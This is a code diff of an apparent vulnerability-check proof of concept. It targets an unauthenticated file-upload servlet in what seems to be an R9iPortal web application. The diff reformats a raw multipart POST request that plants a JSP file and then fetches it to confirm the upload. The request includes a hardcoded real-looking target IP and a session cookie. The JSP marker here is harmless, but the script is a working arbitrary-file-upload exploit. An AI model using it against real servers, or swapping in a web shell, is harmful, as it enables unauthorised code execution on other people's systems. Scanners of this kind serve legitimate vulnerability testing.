@@ -37,20 +37,19 @@ class Poc(ABPoc):
             vun_url=arg+"/servlet/FileUpload?fileName=test.jsp&actionID=update"
             verify_url=arg+"/R9iPortal/upload/test.jsp"
             raw='''POST /servlet/FileUpload?fileName=test.jsp&actionID=update HTTP/1.1
-                Host: 125.67.66.250:801
-                Content-Length: 29
-                Cache-Control: max-age=0
-                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-                Origin: null
-                Upgrade-Insecure-Requests: 1
-                User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
-                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryttI4BZKhDL2Vl8rL
-                Accept-Encoding: gzip, deflate
-                Accept-Language: zh-CN,zh;q=0.8
-                Cookie: JSESSIONID=3D2A49AAB839B03E25A57806A2AB773C
+Host: 125.67.66.250:801
+Content-Length: 29
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: null
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryttI4BZKhDL2Vl8rL
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: JSESSIONID=3D2A49AAB839B03E25A57806A2AB773C
 
-                <% out.println("testvul");%>
-                '''
+<% out.println("testvul");%>'''
             code,head,res,errcode,finalurl=hh.http(vun_url,raw=raw)
             code,head,res,errcode,finalurl=hh.http(verify_url)
             if code==200 and "testvul" in res:
